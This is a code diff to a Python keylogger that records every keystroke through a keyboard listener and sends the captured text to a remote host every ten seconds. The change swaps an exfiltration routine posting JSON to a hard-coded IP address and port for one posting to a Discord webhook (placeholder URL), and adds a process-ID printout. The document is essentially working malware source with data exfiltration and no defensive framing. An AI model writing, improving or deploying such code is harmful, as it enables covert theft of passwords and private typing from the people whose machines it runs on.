@@ -7,28 +7,43 @@ import requests
 import json
 #  The Timer module is part of the threading package.
 import threading
+import os
 
 # We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
 text = ""
 
 # Hard code the values of your server and ip address here.
-ip_address = "109.74.200.23"
+ip_address = "  "
 port_number = "8080"
 # Time interval in seconds for code to execute.
 time_interval = 10
 
-def send_post_req():
-    try:
-        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
-        # the format {"keyboardData" : "<value_of_text>"}
-        payload = json.dumps({"keyboardData" : text})
-        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
-        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
-        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
-        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
-        timer = threading.Timer(time_interval, send_post_req)
-        # We start the timer thread.
+print(os.getpid())
+
+def send_to_discord():
+    try: 
+        webhook_url = "insert/discord/webhook"
+
+        headers = {
+            "Content-Type": "application/json"
+        }
+
+        data = {
+            "content": text
+        }
+
+        response = requests.post(webhook_url, headers=headers, json=data)
+
+        timer = threading.Timer(time_interval, send_to_discord)
+            # We start the timer thread.
         timer.start()
+
+        # if response.status_code == 200 or response.status_code == 204:
+        #     print("\n\n[+] Log successfully sent to Discord.")
+        # else:
+        #     print(f"\n\n[+] Failed to send log to Discord. Status code: {response.status_code}, Response: {response.text}")
+        
+        # return response.status_code
     except:
         print("Couldn't complete request!")
 
@@ -64,5 +79,5 @@ def on_press(key):
 with keyboard.Listener(
     on_press=on_press) as listener:
     # We start of by sending the post request to our server.
-    send_post_req()
+    send_to_discord()
     listener.join()
